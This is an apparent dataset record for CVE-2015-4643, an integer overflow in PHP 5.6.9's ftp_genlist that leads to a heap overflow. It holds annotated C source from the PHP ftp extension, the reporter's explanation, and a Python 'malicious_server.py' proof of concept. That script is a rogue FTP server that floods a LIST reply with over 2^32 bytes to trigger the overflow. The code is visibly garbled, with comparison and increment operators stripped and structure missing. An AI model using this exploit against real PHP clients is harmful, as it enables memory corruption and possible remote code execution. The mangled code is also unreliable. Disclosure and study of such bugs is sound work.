{
    "text": "vul_name : PHP 5.6.9 Integer overflow in ftp_genlist (  ) resulting in heap overflow ， vul_cve : CVE-2015-4643 ， vul_poc : Description :  ， The ftp_genlist (  ) function of the ftp extension is prone to an integer overflow , which may result in remote code execution. ， ext/ftp/ftp.c : ftp_genlist ( . )  ， 1826 size = 0 ;  ， 1827 lines = 0 ;  ， 1828 lastch = 0 ;  ， 1829 while ( rcvd = my_recv ( ftp , data->fd , data->buf , FTP_BUFSIZE ) { ， 1830 if ( rcvd = -1 ) { ， 1831 goto bail ;  ， 1832 } ， 1833 ， 1834 php_stream_write ( tmpstream , data->buf , rcvd )  ;  ， 1835 ， 1836 size += rcvd ;  ， 1837 for ( ptr = data->buf ; rcvd ; rcvd- , ptr+ ) { ， 1838 if (  * ptr = '\\n' lastch = '\\r' ) { ， 1839 lines+ ; / [ 0 ]  ， 1840 } else { ， 1841 size+ ; / [ 1 ]  ， 1842 } ， 1843 lastch = * ptr ;  ， 1844 } ， 1845 } ， In the above loop `size' or `lines' may overflow ( at [ 0 ] respectively [ 1 ]  ) . ， This requires sending more than 2^32 bytes , which will be stored in a tempfile. ， 1851 ret = safe_emalloc ( lines + 1 )  , sizeof ( char *  )  , size )  ; / [ 2 ]  ， 1852 ， 1853 entry = ret ;  ， 1854 text = ( char *  )  ( ret + lines + 1 )  ;  ， 1855 * entry = text ;  ， 1856 lastch = 0 ;  ， 1857 while ( ch = php_stream_getc ( tmpstream )  ! = EOF ) { ， 1858 if ( ch = '\\n' lastch = '\\r' ) { ， 1859 *  ( text - 1 ) = 0 ;  ， 1860 * +entry = text ;  ， 1861 } else { ， 1862 * text+ = ch ; / [ 3 ]  ， 1863 } ， 1864 lastch = ch ;  ， 1865 } ， 1866 * entry = NULL ;  ， This results in the allocated buffer at [ 2 ] being to small to hold the data written to ， the tempfile , which results in a heap overflow at [ 3 ] when loading the contents of the ， tempfile back into memory. ， These kind of bugs are well-known to be exploitable and since php_stream_getc uses structs ， located on the heap , which may be overwritten , I think that this bug can be leveraged to attain ， remote code execution. ， Regards ,  ， Max Spelsberg ， malicious_server.py ，  #  ! /usr/bin/env python2 ，  # coding : utf-8 ，  # based on ， allow_delete = False ， local_ip = \"localhost\" ， local_port = 8887 ， currdir=os.path.abspath ( '.' )  ， class FTPserverThread ( threading.Thread )  :  ， self.conn=conn ， self.addr=addr ， self.basewd=currdir ， self.cwd=self.basewd ， self.rest=False ， self.pasv_mode=False ， threading.Thread._init_ ( self )  ， self.conn.send ( '220 Welcome ! \\r\\n' )  ， cmd=self.conn.recv ( 256 )  ， print 'Recieved : ' , cmd ， func=getattr ( self , cmd [  : 4 ] .strip (  ) .upper (  )  ， func ( cmd )  ， print 'ERROR : ' , e ，  # traceback.print_exc (  )  ， self.conn.send ( '500 Sorry.\\r\\n' )  ， self.conn.close (  )  ， self.mode=cmd [ 5 ]  ， self.conn.send ( '200 Binary mode.\\r\\n' )  ， self.pasv_mode = True ， self.servsock = socket.socket ( socket.AF_INET , socket.SOCK_STREAM )  ， self.servsock.bind ( local_ip , 0 )  ， self.servsock.listen ( 1 )  ， ip , port = self.servsock.getsockname (  )  ， print 'open' , ip , port ， self.conn.send ( '227 Entering Passive Mode ( %s , %u , %u ) .\\r\\n' % ，  ( ' , '.join ( ip.split ( '.' )  , port8&0xFF , port&0xFF )  ， self.datasock , addr = self.servsock.accept (  )  ， print 'connect : ' , addr ， self.datasock=socket.socket ( socket.AF_INET , socket.SOCK_STREAM )  ， self.datasock.connect ( self.dataAddr , self.dataPort )  ， self.datasock.close (  )  ， self.servsock.close (  )  ，  # THIS is the interesting part ， self.conn.send ( '150 Here comes the directory listing.\\r\\n' )  ， print 'list : ' , self.cwd ， self.start_datasock (  )  ，  # send 2^32 + 1 bytes of data ， print \"%d\" % i ， self.datasock.send ( \"B\" * 16384 )  ， self.datasock.send ( \"A\\r\\n\" )  ， self.stop_datasock (  )  ， self.conn.send ( '226 Directory send OK.\\r\\n' )  ， class FTPserver ( threading.Thread )  :  ， self.sock = socket.socket ( socket.AF_INET , socket.SOCK_STREAM )  ， self.sock.bind ( local_ip , local_port )  ， threading.Thread._init_ ( self )  ， self.sock.listen ( 5 )  ， th=FTPserverThread ( self.sock.accept (  )  ， th.daemon=True ， th.start (  )  ， self.sock.close (  )  ， ftp=FTPserver (  )  ， ftp.daemon=True ， ftp.start (  )  ， print 'On' , local_ip , ' : ' , local_port ， raw_input ( 'Enter to end.\\n' )  ， ftp.stop (  )  ， buggy.php",
    "time": "2015.06.18"
}